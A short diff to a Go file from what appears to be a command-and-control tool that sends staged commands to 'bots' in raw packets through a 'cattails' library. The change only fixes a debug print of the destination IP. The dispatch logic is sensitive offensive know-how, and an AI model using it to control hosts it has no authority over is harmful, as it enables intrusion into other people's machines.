@@ -48,7 +48,7 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 			fmt.Println("SRC MAC:", iface.HardwareAddr)
 			fmt.Println("DST MAC:", dstMAC)
 			fmt.Println("SRC IP:", myIP)
-			fmt.Println("DST IP:", bot.IP)
+			fmt.Println("DST IP:", bot.RespIP)
 			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, dstMAC, cattails.CreateCommand(stagedCmd))
 			// YEET
 			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
